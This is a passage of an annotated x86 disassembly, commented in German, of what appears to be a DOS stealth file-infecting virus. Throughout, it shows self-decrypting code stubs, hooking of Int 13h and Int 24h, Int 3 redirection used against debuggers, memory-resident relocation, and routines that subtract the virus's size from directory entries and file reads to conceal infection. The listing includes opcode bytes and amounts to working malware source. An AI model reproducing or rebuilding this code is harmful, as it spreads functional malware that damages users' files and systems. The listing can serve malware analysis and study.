    MOV CX,OFFSET L08E8         ;439A B9 E8 08
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;439D E8 E9 05
    DB  0BH             ;43A0 0B
                        ;L43A1    L43A6 CJ
L43A1:  XOR BYTE PTR CS:[BX],0BF        ;43A1 2E 80 37 BF
    INC BX              ;43A5 43
    LOOP    L43A1               ;43A6 E2 F9
    RET_NEAR                ;43A8 C3

                        ;L43A9    L297F CJ  L3939 CJ
L43A9:  MOV WORD PTR CS:L0799,0     ;43A9 2E C7 06 99 07 00 00
    DB  0E8             ;43B0 E8
                        ;L43B1    L31B6 CC  L344F CC
L43B1:  CALL    L3243           ;decode_code    ;43B1 E8 8F EE
    DW  LE41D               ;43B4 1D E4
    CALL    L482E               ;43B6 E8 75 04
    PUSH    DX              ;43B9 52
    MOV AH,36   ;'6'            ;43BA B4 36
    MOV DL,CS:L2428         ;43BC 2E 8A 16 28 24
    CALL    WORD PTR CS:L2566       ;43C1 2E FF 16 66 25
    MUL CX              ;43C6 F7 E1
    MUL BX              ;43C8 F7 E3
    MOV BX,DX               ;43CA 89 D3
    POP DX              ;43CC 5A
    OR  BX,BX               ;43CD 0B DB
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;43CF E8 B7 05
    DB  1E              ;43D2 1E
    JNZ L43DA               ;43D3 75 05
    CMP AX,OFFSET L4000         ;43D5 3D 00 40
    JB  L443D               ;43D8 72 63
                        ;L43DA    L43D3 CJ
L43DA:  MOV AX,OFFSET L4300         ;43DA B8 00 43
    CALL    WORD PTR CS:L2566       ;43DD 2E FF 16 66 25
    JB  L443D               ;43E2 72 59
    CALL    L3243           ;decode_code    ;43E4 E8 5C EE
    DW  L9023               ;43E7 23 90
                        ;L43E9    L3936 DI
L43E9:  MOV CS:L24F4,DX         ;43E9 2E 89 16 F4 24
    MOV CS:L24F2,CX         ;43EE 2E 89 0E F2 24
    MOV CS:L24F6,DS         ;43F3 2E 8C 1E F6 24
    MOV AX,OFFSET L4301         ;43F8 B8 01 43
    XOR CX,CX               ;43FB 33 C9
    CALL    WORD PTR CS:L2566       ;43FD 2E FF 16 66 25
                        ;L4400    L4468 DI
L4400   EQU $-2
    CMP BYTE PTR CS:L24DA,0     ;4402 2E 80 3E DA 24 00
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4408 E8 7E 05
    DB  24              ;440B 24
    JNZ L443D               ;440C 75 2F
    MOV AX,OFFSET L3D02         ;440E B8 02 3D
    CALL    WORD PTR CS:L2566       ;4411 2E FF 16 66 25
    JB  L443D               ;4416 72 25
    CALL    L3243           ;decode_code    ;4418 E8 28 EE
    DW  L801E               ;441B 1E 80
    MOV BX,AX               ;441D 8B D8
    PUSH    BX              ;441F 53
    MOV AH,32   ;'2'            ;4420 B4 32
    MOV DL,CS:L2428         ;4422 2E 8A 16 28 24
    CALL    WORD PTR CS:L2566       ;4427 2E FF 16 66 25
    MOV AX,[BX+1E]          ;442C 8B 47 1E
    MOV CS:L24EC,AX         ;442F 2E A3 EC 24
    POP BX              ;4433 5B
    CALL    L48CD           ;restauriere Int 13h & Int 24h  
                        ;4434 E8 96 04
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4437 E8 4F 05
    DB  1F              ;443A 1F
    RET_NEAR                ;443B C3

    DB  0C6             ;443C C6
                        ;L443D    L43D8 CJ  L43E2 CJ  L440C CJ  L4416 CJ
L443D:  CALL    L3243           ;decode_code    ;443D E8 03 EE
    DW  LEB0A               ;4440 0A EB
    XOR BX,BX               ;4442 33 DB
    DEC BX              ;4444 4B
    CALL    L48CD           ;restauriere Int 13h & Int 24h  
                        ;4445 E8 85 04
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4448 E8 3E 05
    DB  0BH             ;444B 0B
    RET_NEAR                ;444C C3

    CALL    L3243           ;decode_code    ;444D E8 F3 ED
    DW  LD80C               ;4450 0C D8
    XOR AL,AL               ;4452 32 C0
    MOV BYTE PTR CS:L24DA,1     ;4454 2E C6 06 DA 24 01
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;445A E8 2C 05
    DB  0DH             ;445D 0D
    IRET                    ;445E CF

    DB  8C              ;445F 8C
                        ;L4460    L456B CC  L45BB CC  L4674 CC
L4460:  CALL    L3243           ;decode_code    ;4460 E8 E0 ED
    DW  LA025               ;4463 25 A0
    PUSH    CX              ;4465 51
    PUSH    DX              ;4466 52
    PUSH    AX              ;4467 50
    MOV AX,OFFSET L4400         ;4468 B8 00 44
    CALL    WORD PTR CS:L2566       ;446B 2E FF 16 66 25
    XOR DL,80               ;4470 80 F2 80
    TEST    DL,80               ;4473 F6 C2 80
    JZ  L4483               ;4476 74 0B
    MOV AX,OFFSET L5700         ;4478 B8 00 57
    CALL    WORD PTR CS:L2566       ;447B 2E FF 16 66 25
    TEST    CH,80               ;4480 F6 C5 80
                        ;L4483    L4476 CJ
L4483:  POP AX              ;4483 58
    POP DX              ;4484 5A
    POP CX              ;4485 59
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4486 E8 00 05
    DB  26              ;4489 26
    RET_NEAR                ;448A C3

    DB  0F6             ;448B F6
                        ;L448C    L44B8 CJ
L448C:  CMP WORD PTR CS:L2581,4     ;448C 2E 83 3E 81 25 04
    JB  L44BA               ;4492 72 26
    PUSH    CS              ;4494 0E
    POP BX              ;4495 5B
    SUB BH,20   ;' '            ;4496 80 EF 20
    MOV AX,CS:L257B         ;4499 2E A1 7B 25
    CMP AX,BX               ;449D 39 D8
    JB  L44BA               ;449F 72 19
    MOV CS:L257B,BX         ;44A1 2E 89 1E 7B 25
    JMP SHORT   L44BA           ;44A6 EB 12

    DB  0E8             ;44A8 E8
                        ;L44A9    L451D CJ
;   new int 03
L44A9:  SUB BYTE PTR CS:L1CA8,52    ;'R'    ;44A9 2E 80 2E A8 1C 52
    PUSH    CS:L2579            ;44AF 2E FF 36 79 25
    POP CX              ;44B4 59
    CMP CH,40   ;'@'            ;44B5 80 FD 40
    JZ  L448C               ;44B8 74 D2
                        ;L44BA    L4492 CJ  L449F CJ  L44A6 CJ
L44BA:  POP DS:0E               ;44BA 8F 06 0E 00
    POP DS:0C               ;44BE 8F 06 0C 00
    ADD BYTE PTR CS:L1CA8,52    ;'R'    ;44C2 2E 80 06 A8 1C 52
    CALL    L4B84           ;Register restaurieren (Feld)   
                        ;44C8 E8 B9 06
    JMP L2AFB               ;44CB E9 2D E6

                        ;L44CE    L468F CC
L44CE:  CALL    L3243           ;decode_code    ;44CE E8 72 ED
    DW  L3A46               ;44D1 46 3A
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;44D3 E8 B5 E7
    XOR CX,CX               ;44D6 33 C9
    MOV AX,OFFSET L4201         ;44D8 B8 01 42
    XOR DX,DX               ;44DB 33 D2
    CALL    WORD PTR CS:L2566       ;44DD 2E FF 16 66 25
    MOV CS:L24A7,DX         ;44E2 2E 89 16 A7 24
    MOV CS:L24A5,AX         ;44E7 2E A3 A5 24
    MOV AX,OFFSET L4202         ;44EB B8 02 42
    XOR CX,CX               ;44EE 33 C9
    XOR DX,DX               ;44F0 33 D2
    CALL    WORD PTR CS:L2566       ;44F2 2E FF 16 66 25
    MOV CS:L24AB,DX         ;44F7 2E 89 16 AB 24
    MOV CS:L24A9,AX         ;44FC 2E A3 A9 24
    MOV AX,OFFSET L4200         ;4500 B8 00 42
    MOV DX,CS:L24A5         ;4503 2E 8B 16 A5 24
    MOV CX,CS:L24A7         ;4508 2E 8B 0E A7 24
    CALL    WORD PTR CS:L2566       ;450D 2E FF 16 66 25
    CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;4512 E8 C2 E6
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4515 E8 71 04
    DB  47              ;4518 47
    RET_NEAR                ;4519 C3

    POP AX              ;451A 58
    POP BX              ;451B 5B
    POP CX              ;451C 59
    JMP SHORT   L44A9       ;new int 03 ;451D EB 8A

    OR  AL,AL               ;451F 0A C0
    JNZ L4550               ;4521 75 2D
    CALL    L3243           ;decode_code    ;4523 E8 1D ED
    DW  LA512               ;4526 12 A5
    DB  2E,83,26,0B3,24         ;4528 2E 83 26 B3 24
    DB  0FE             ;452D FE
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;452E E8 89 E6
    CALL    WORD PTR CS:L2566       ;4531 2E FF 16 66 25
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4536 E8 50 04
    DB  13              ;4539 13
    JB  L4547               ;453A 72 0B
    TEST    CH,80               ;453C F6 C5 80
    JZ  L4544               ;453F 74 03
    SUB CH,80               ;4541 80 ED 80
                        ;L4544    L453F CJ
L4544:  JMP L2B95               ;4544 E9 4E E6

                        ;L4547    L453A CJ
L4547   DB  2E,83,0E,0B3,24         ;4547 2E 83 0E B3 24
    DB  1               ;454C 01
    JMP L2B95               ;454D E9 45 E6

                        ;L4550    L4521 CJ
L4550:  CMP AL,1                ;4550 3C 01
    JNZ L45CD               ;4552 75 79
    CALL    L3243           ;decode_code    ;4554 E8 EC EC
    DW  L280D               ;4557 0D 28
    DB  2E,83,26,0B3,24         ;4559 2E 83 26 B3 24
    DB  0FE             ;455E FE
    TEST    CH,80               ;455F F6 C5 80
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4562 E8 24 04
    DB  0E              ;4565 0E
    JZ  L456B               ;4566 74 03
                        ;L4568    L28BD DI  L3877 DI  L3888 DI
L4568:  SUB CH,80               ;4568 80 ED 80
                        ;L456B    L4566 CJ
L456B:  CALL    L4460               ;456B E8 F2 FE
    JZ  L4573               ;456E 74 03
    ADD CH,80               ;4570 80 C5 80
                        ;L4573    L456E CJ
L4573:  CALL    L3243           ;decode_code    ;4573 E8 CD EC
    DW  L6412               ;4576 12 64
    CALL    WORD PTR CS:L2566       ;4578 2E FF 16 66 25
    MOV [BP-4],AX           ;457D 89 46 FC
                        ;L457E    L45DA CJ
L457E   EQU $-2
    ADC WORD PTR CS:L24B3,0     ;4580 2E 83 16 B3 24 00
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4586 E8 00 04
    DB  13              ;4589 13
    JMP L2EA3               ;458A E9 16 E9

                        ;L458D    L4A7F CJ
;   Int 03 auf cs:1d0a+2810 -> 451a verbiegen und aufrufen
L458D:  CALL    L4A9D           ;Register sichern (Feld)    
                        ;458D E8 0D 05
    IN  AL,21               ;4590 E4 21
    OR  AL,2                ;4592 0C 02
    OUT 21,AL               ;4594 E6 21
    PUSH    AX              ;4596 50
    MOV AX,0                ;4597 B8 00 00
    MOV DS,AX               ;459A 8E D8
    POP AX              ;459C 58
    PUSH    DS:0C               ;459D FF 36 0C 00
    PUSH    DS:0E               ;45A1 FF 36 0E 00
    PUSH    CS              ;45A5 0E
    POP DS:0E               ;45A6 8F 06 0E 00
    MOV WORD PTR DS:0C,OFFSET L1D0A ;45AA C7 06 0C 00 0A 1D
    INT 3               ;45B0 CC
    DB  83              ;45B1 83
    CALL    L3243           ;decode_code    ;45B2 E8 8E EC
    DW  L4016               ;45B5 16 40
    CMP AL,2                ;45B7 3C 02
    JNZ L45C9               ;45B9 75 0E
    CALL    L4460               ;45BB E8 A2 FE
    JZ  L45C9               ;45BE 74 09
    SUB WORD PTR [BP-0A],OFFSET L2400   ;45C0 81 6E F6 00 24
    SBB WORD PTR [BP-8],0       ;45C5 83 5E F8 00
                        ;L45C9    L45B9 CJ  L45BE CJ
L45C9:  CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;45C9 E8 BD 03
    DB  17              ;45CC 17
                        ;L45CD    L4552 CJ
L45CD:  JMP L2B8B               ;45CD E9 BB E5

    CALL    L3243           ;decode_code    ;45D0 E8 70 EC
    XCHG    BP,AX               ;45D3 95
    POP BP              ;45D4 5D
    MOV CH,39   ;'9'            ;45D5 B5 39
    MOV BX,OFFSET L77E9         ;45D7 BB E9 77
    JNB L457E               ;45DA 73 A2
    DEC BX              ;45DC 4B
    CMP DI,[BX+SI-23]           ;45DD 3B 78 DD
    MOV L295F,AX            ;45E0 A3 5F 29
    PUSH    BP              ;45E3 55
    ESC 2C,[BP+DI+OFFSET L295E]     ;45E4 DD A3 5E 29
                        ;L45E8    L4644 CJ
L45E8:  PUSH    SI              ;45E8 56
    MOV AH,2A   ;'*'            ;45E9 B4 2A
    POP BP              ;45EB 5D
    ESC 2C,[BX+OFFSET L2E4E]        ;45EC DD A7 4E 2E
    PUSH    SI              ;45F0 56
    MOV AH,32   ;'2'            ;45F1 B4 32
    POP BP              ;45F3 5D
    ESC 2C,[BX+OFFSET L2F48]        ;45F4 DD A7 48 2F
    POP SI              ;45F8 5E
    MOV AH,3A   ;':'            ;45F9 B4 3A
    POP BP              ;45FB 5D
    MOV AH,63   ;'c'            ;45FC B4 63
    POP BP              ;45FE 5D
    OR  [DI],DX             ;45FF 09 15
    SBB [DI+0A],BH          ;4601 18 7D 0A
    ADC AX,OFFSET L111C         ;4604 15 1C 11
    SBB [DI+14],BH          ;4607 18 7D 14
    ADC DI,[DI+0E]          ;460A 13 7D 0E
    SBB [SI],BL             ;460D 18 1C
    DB  0F  ??          ;460F 0F
    PUSH    DS              ;4610 1E
    ADC AX,OFFSET L127D         ;4611 15 7D 12
    SBB DI,[DI+9]           ;4614 1B 7D 09
                        ;L4615    L4652 CJ
L4615   EQU $-2
    ADC AX,OFFSET L7D18         ;4617 15 18 7D
    DB  65  ??          ;461A 65
    JGE L4638               ;461B 7D 1B
    ADC AL,0E               ;461D 14 0E
    ADC AX,OFFSET L5057 ;'PW'       ;461F 15 57 50
    ADC AL,7DH              ;4622 14 7D
    SBB AL,10               ;4624 1C 10
    JGE L46A2               ;4626 7D 7A
                        ;L4628    L2BDC DI
L4628:  AND SI,L2733            ;4628 23 36 33 27
    AND AL,2BH  ;'+'            ;462C 24 2B
    XOR AH,[BX+SI]          ;462E 32 20
    JPE L46AF               ;4630 7A 7D
    ADC AL,13               ;4632 14 13
    JGE L464B               ;4634 7D 15
    SBB AL,10               ;4636 1C 10
                        ;L4638    L461B CJ
L4638:  POP DS              ;4638 1F
    OR  [BX],CL             ;4639 08 0F
    SBB BH,[BX+DI-17]           ;463B 1A 79 E9
    PUSH    SP              ;463E 54
    PUSH    BX              ;463F 53
    INC DX              ;4640 42
    OUT 0B2,AX              ;4641 E7 B2
    INC AX              ;4643 40
    JNB L45E8               ;4644 73 A2
    DEC BX              ;4646 4B
    CMP DI,[BX+SI+73]           ;4647 3B 78 73
                        ;L4649    L2F8C DI  L343A DI  L371D DI  L3756 DI
L4649   EQU $-1
    CALL    FAR PTR L5CDB           ;464A 9A 5B C5 78 A9
                        ;L464B    L4634 CJ
L464B   EQU $-4
    TEST    AX,OFFSET LC5E6         ;464F A9 E6 C5
    JS  L4615               ;4652 78 C1
    PUSH    BX              ;4654 53
    PUSH    CS              ;4655 0E
    DB  6E  ??          ;4656 6E
    POPF                    ;4657 9D
    ROL WORD PTR [DI+L5B9A],CL      ;4658 D3 85 9A 5B
    POP BX              ;465C 5B
    POP BP              ;465D 5D
    MOV LB5A2,AL            ;465E A2 A2 B5
    RCR WORD PTR [BX+DI-4BH],1      ;4661 D1 59 B5
    OR  [BX+SI+L7DB5],DI        ;4664 09 B8 B5 7D
    POP SI              ;4668 5E
    RET_FAR                 ;4669 CB

    RET_NEAR                ;466A C3

                        ;L466B    L4677 CJ
L466B:  JMP L2B8B               ;466B E9 1D E5

    AND BYTE PTR CS:L24B3,0FE       ;466E 2E 80 26 B3 24 FE
    CALL    L4460               ;4674 E8 E9 FD
    JZ  L466B               ;4677 74 F2
    CALL    L3243           ;decode_code    ;4679 E8 C7 EB
    DW  L0431               ;467C 31 04
    MOV CS:L24AD,DX         ;467E 2E 89 16 AD 24
    MOV CS:L24AF,CX         ;4683 2E 89 0E AF 24
    MOV WORD PTR CS:L24B1,0     ;4688 2E C7 06 B1 24 00 00
    CALL    L44CE               ;468F E8 3C FE
    MOV AX,CS:L24A9         ;4692 2E A1 A9 24
    MOV DX,CS:L24AB         ;4696 2E 8B 16 AB 24
    SUB AX,OFFSET L2400         ;469B 2D 00 24
    SBB DX,0                ;469E 83 DA 00
    SUB AX,CS:L24A5         ;46A1 2E 2B 06 A5 24
                        ;L46A2    L4626 CJ
L46A2   EQU $-4
    SBB DX,CS:L24A7         ;46A6 2E 1B 16 A7 24
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;46AB E8 DB 02
    DB  32              ;46AE 32
                        ;L46AF    L4630 CJ
L46AF:  JNS L46B9               ;46AF 79 08
    MOV WORD PTR [BP-4],0       ;46B1 C7 46 FC 00 00
    JMP L31E7               ;46B6 E9 2E EB

                        ;L46B9    L46AF CJ
L46B9:  CALL    L3243           ;decode_code    ;46B9 E8 87 EB
    DW  L271A               ;46BC 1A 27
    JNZ L46C8               ;46BE 75 08
    CMP AX,CX               ;46C0 3B C1
    JA  L46C8               ;46C2 77 04
    MOV CS:L24AF,AX         ;46C4 2E A3 AF 24
                        ;L46C8    L46BE CJ  L46C2 CJ
L46C8:  MOV CX,CS:L24A7         ;46C8 2E 8B 0E A7 24
    MOV DX,CS:L24A5         ;46CD 2E 8B 16 A5 24
    OR  CX,CX               ;46D2 0B C9
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;46D4 E8 B2 02
    DB  1BH             ;46D7 1B
    JNZ L46DF               ;46D8 75 05
    CMP DX,1C               ;46DA 83 FA 1C
    JBE L4704               ;46DD 76 25
                        ;L46DF    L46D8 CJ  L477D CJ
L46DF:  CALL    L3243           ;decode_code    ;46DF E8 61 EB
    DW  LE91D               ;46E2 1D E9
    MOV DX,CS:L24AD         ;46E4 2E 8B 16 AD 24
    MOV AH,3F   ;'?'            ;46E9 B4 3F
    MOV CX,CS:L24AF         ;46EB 2E 8B 0E AF 24
    CALL    WORD PTR CS:L2566       ;46F0 2E FF 16 66 25
    ADD AX,CS:L24B1         ;46F5 2E 03 06 B1 24
    MOV [BP-4],AX           ;46FA 89 46 FC
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;46FD E8 89 02
    PUSH    DS              ;4700 1E
    JMP L2EA3               ;4701 E9 9F E7

                        ;L4704    L46DD CJ
L4704:  MOV DI,DX               ;4704 89 D7
    MOV SI,DX               ;4706 89 D6
    ADD DI,CS:L24AF         ;4708 2E 03 3E AF 24
    CMP DI,1C               ;470D 83 FF 1C
    JB  L4717               ;4710 72 05
    XOR DI,DI               ;4712 33 FF
    JMP SHORT   L471C           ;4714 EB 06

    DB  0F7             ;4716 F7
                        ;L4717    L4710 CJ
L4717:  SUB DI,1C               ;4717 83 EF 1C
    NEG DI              ;471A F7 DF
                        ;L471C    L4714 CJ
L471C:  CALL    L3243           ;decode_code    ;471C E8 24 EB
    DW  LFE5C               ;471F 5C FE
    MOV AX,DX               ;4721 8B C2
    MOV DX,CS:L24A9         ;4723 2E 8B 16 A9 24
    MOV CX,CS:L24AB         ;4728 2E 8B 0E AB 24
    ADD DX,0F               ;472D 83 C2 0F
    ADC CX,0                ;4730 83 D1 00
    DB  83,0E2,0F0          ;4733 83 E2 F0
    SUB DX,OFFSET L23FC         ;4736 81 EA FC 23
    SBB CX,0                ;473A 83 D9 00
    ADD DX,AX               ;473D 01 C2
    ADC CX,0                ;473F 83 D1 00
    MOV AX,OFFSET L4200         ;4742 B8 00 42
    CALL    WORD PTR CS:L2566       ;4745 2E FF 16 66 25
    MOV CX,1C               ;474A B9 1C 00
    SUB CX,DI               ;474D 29 F9
    SUB CX,SI               ;474F 29 F1
    MOV AH,3F   ;'?'            ;4751 B4 3F
    MOV DX,CS:L24AD         ;4753 2E 8B 16 AD 24
    CALL    WORD PTR CS:L2566       ;4758 2E FF 16 66 25
    ADD CS:L24AD,AX         ;475D 2E 01 06 AD 24
    SUB CS:L24AF,AX         ;4762 2E 29 06 AF 24
    ADD CS:L24B1,AX         ;4767 2E 01 06 B1 24
    XOR CX,CX               ;476C 33 C9
    MOV AX,OFFSET L4200         ;476E B8 00 42
    MOV DX,1C               ;4771 BA 1C 00
    CALL    WORD PTR CS:L2566       ;4774 2E FF 16 66 25
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4779 E8 0D 02
    DB  5DH             ;477C 5D
    JMP L46DF               ;477D E9 5F FF

    CALL    L3243           ;decode_code    ;4780 E8 C0 EA
    DW  L2515               ;4783 15 25
    DB  2E,83,26,0B3,24         ;4785 2E 83 26 B3 24
    DB  0FE             ;478A FE
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;478B E8 2C E4
    CALL    WORD PTR CS:L2566       ;478E 2E FF 16 66 25
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;4793 E8 A6 E4
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4796 E8 F0 01
    DB  16              ;4799 16
    JNB L47A5               ;479A 73 09
    DB  2E,83,0E,0B3,24         ;479C 2E 83 0E B3 24
    DB  1               ;47A1 01
    JMP L2EA3               ;47A2 E9 FE E6

                        ;L47A5    L479A CJ
L47A5:  CALL    L322B           ;get DTA-adress nach ds:bx  
                        ;47A5 E8 83 EA
    TEST    BYTE PTR [BX+17],80     ;47A8 F6 47 17 80
    JNZ L47B7               ;47AC 75 09
    JMP L2EA3               ;47AE E9 F2 E6

                        ;L47B1    L2AEF CJ
L47B1:  CLC                 ;47B1 F8
    INC DX              ;47B2 42
    PUSH    DS              ;47B3 1E
    POP ES              ;47B4 07
    PUSH    DX              ;47B5 52
    DB  0EBH                ;47B6 EB
                        ;L47B7    L47AC CJ
L47B7:  CALL    L3243           ;decode_code    ;47B7 E8 89 EA
    DW  LD811               ;47BA 11 D8
    SUB WORD PTR [BX+1A],OFFSET L2400   ;47BC 81 6F 1A 00 24
    SBB WORD PTR [BX+1C],0      ;47C1 83 5F 1C 00
    SUB BYTE PTR [BX+17],80     ;47C5 80 6F 17 80
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;47C9 E8 BD 01
    DB  12              ;47CC 12
    JMP L2EA3               ;47CD E9 D3 E6

                        ;L47D0    L2944 CC
;   Code nach TOM kopieren, Code ab 2a15:0000 codieren, retf nach 1b1+2810 -> 29c1
L47D0:  CALL    L3243           ;decode_code    ;47D0 E8 70 EA
    DW  L8A46               ;47D3 46 8A
    CALL    L3350           ;Code compare   ;47D5 E8 78 EB
    PUSH    DS              ;47D8 1E
    XOR AX,AX               ;47D9 33 C0
    MOV DS,AX               ;47DB 8E D8
    MOV WORD PTR DS:0E,70   ;'p'    ;47DD C7 06 0E 00 70 00
    MOV WORD PTR DS:0C,OFFSET L0756 ;47E3 C7 06 0C 00 56 07
    POP DS              ;47E9 1F
    MOV ES,L2445            ;47EA 8E 06 45 24
    PUSH    ES              ;47EE 06
    POP DS              ;47EF 1F
    SUB WORD PTR DS:2,OFFSET L0270  ;47F0 81 2E 02 00 70 02
    MOV DX,DS               ;47F6 8C DA
    DEC DX              ;47F8 4A
    MOV DS,DX               ;47F9 8E DA
    MOV AX,DS:3             ;47FB A1 03 00
    SUB AX,OFFSET L0270         ;47FE 2D 70 02
    ADD DX,AX               ;4801 01 C2
    MOV DS:3,AX             ;4803 A3 03 00
    POP DI              ;4806 5F
    INC DX              ;4807 42
    MOV ES,DX               ;4808 8E C2
    PUSH    CS              ;480A 0E
    POP DS              ;480B 1F
    MOV SI,OFFSET L26FE         ;480C BE FE 26
    MOV CX,OFFSET L1380         ;480F B9 80 13
    MOV DI,SI               ;4812 89 F7
    STD                 ;4814 FD
    XOR BX,BX               ;4815 33 DB
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4817 E8 6F 01
    DB  47              ;481A 47
                        ;L481B    L39F1 DI
L481B:  REPZ    MOVSW               ;481B F3 A5
    CLD                 ;481D FC
    PUSH    ES              ;481E 06
    MOV AX,OFFSET L01B1         ;481F B8 B1 01
    PUSH    AX              ;4822 50
    MOV ES,CS:L2445         ;4823 2E 8E 06 45 24
                        ;L4828    L2C90 DI
L4828:  MOV CX,OFFSET L236C ;'#l'       ;4828 B9 6C 23
    JMP L4B7C               ;482B E9 4E 03

                        ;L482E    L29A0 CC  L3659 CC  L43B6 CC
L482E:  CALL    L3243           ;decode_code    ;482E E8 12 EA
    DW  L4052               ;4831 52 40
    MOV BYTE PTR CS:L24DA,0     ;4833 2E C6 06 DA 24 00
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;4839 E8 4F E4
    PUSH    CS              ;483C 0E
    MOV AL,13               ;483D B0 13
    POP DS              ;483F 1F
    CALL    L2CB9           ;get Int (AL) into es:bx    
                        ;4840 E8 76 E4
    MOV L242F,ES            ;4843 8C 06 2F 24
    MOV L242D,BX            ;4847 89 1E 2D 24
    MOV L243B,ES            ;484B 8C 06 3B 24
    MOV DL,2                ;484F B2 02
    MOV L2439,BX            ;4851 89 1E 39 24
    MOV L2450,DL            ;4855 88 16 50 24
    CALL    L2C58               ;4859 E8 FC E3
    MOV L24DF,SP            ;485C 89 26 DF 24
    MOV L24DD,SS            ;4860 8C 16 DD 24
    PUSH    CS              ;4864 0E
    MOV AX,OFFSET L207D         ;4865 B8 7D 20
    PUSH    AX              ;4868 50
    MOV AX,70   ;'p'            ;4869 B8 70 00
    MOV CX,0FFFF            ;486C B9 FF FF
    MOV ES,AX               ;486F 8E C0
    XOR DI,DI               ;4871 33 FF
    MOV AL,0CBH             ;4873 B0 CB
    REPNZ   SCASB               ;4875 F2 AE
    DEC DI              ;4877 4F
    PUSHF                   ;4878 9C
    PUSH    ES              ;4879 06
    PUSH    DI              ;487A 57
    PUSHF                   ;487B 9C
    POP AX              ;487C 58
    OR  AH,1                ;487D 80 CC 01
    PUSH    AX              ;4880 50
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4881 E8 05 01
    DB  53              ;4884 53
    POPF                    ;4885 9D
    XOR AX,AX               ;4886 33 C0
    JMP DWORD PTR   L242D       ;4888 FF 2E 2D 24

    DB  0E9             ;488C E9
                        ;L488D    L4A11 CJ
L488D:  CALL    L3243           ;decode_code    ;488D E8 B3 E9
    DW  LDE39               ;4890 39 DE
    PUSH    CS              ;4892 0E
    POP DS              ;4893 1F
    PUSH    DS              ;4894 1E
    MOV AL,13               ;4895 B0 13
    LDS DX,DWORD PTR CS:L242D       ;4897 2E C5 16 2D 24
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;489C E8 CD E3
    POP DS              ;489F 1F
    MOV AL,24   ;'$'            ;48A0 B0 24
    CALL    L2CB9           ;get Int (AL) into es:bx    
                        ;48A2 E8 14 E4
    MOV L243D,BX            ;48A5 89 1E 3D 24
    MOV DX,OFFSET L1C3D         ;48A9 BA 3D 1C
    MOV AL,24   ;'$'            ;48AC B0 24
    MOV L243F,ES            ;48AE 8C 06 3F 24
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;48B2 E8 B7 E3
    CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;48B5 E8 1F E3
    PUSH    DS              ;48B8 1E
    PUSH    AX              ;48B9 50
    MOV AX,0                ;48BA B8 00 00
    MOV DS,AX               ;48BD 8E D8
    POP AX              ;48BF 58
    MOV WORD PTR DS:6,70    ;'p'    ;48C0 C7 06 06 00 70 00
    POP DS              ;48C6 1F
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;48C7 E8 BF 00
    DB  3A              ;48CA 3A
    RET_NEAR                ;48CB C3

    DB  0F6             ;48CC F6
                        ;L48CD    L3789 CC  L4434 CC  L4445 CC
;   restauriere Int 13h & Int 24h
L48CD:  CALL    L3243           ;decode_code    ;48CD E8 73 E9
    DW  LE61E               ;48D0 1E E6
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;48D2 E8 B6 E3
    LDS DX,DWORD PTR CS:L2439       ;48D5 2E C5 16 39 24
    MOV AL,13               ;48DA B0 13
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;48DC E8 8D E3
    LDS DX,DWORD PTR CS:L243D       ;48DF 2E C5 16 3D 24
    MOV AL,24   ;'$'            ;48E4 B0 24
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;48E6 E8 83 E3
    CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;48E9 E8 EB E2
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;48EC E8 9A 00
    POP DS              ;48EF 1F
    RET_NEAR                ;48F0 C3

    PUSH    CS              ;48F1 0E
    POP AX              ;48F2 58
                        ;L48F3    L2B8B CJ
L48F3:  CALL    L3243           ;decode_code    ;48F3 E8 4D E9
    DW  LA51A               ;48F6 1A A5
    MOV WORD PTR CS:L2450,OFFSET L0401  ;48F8 2E C7 06 50 24 01 04
    CALL    L2C58               ;48FF E8 56 E3
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;4902 E8 B5 E2
    PUSH    AX              ;4905 50
    MOV AX,CS:L24B3         ;4906 2E A1 B3 24
    OR  AX,OFFSET L0100         ;490A 0D 00 01
    PUSH    AX              ;490D 50
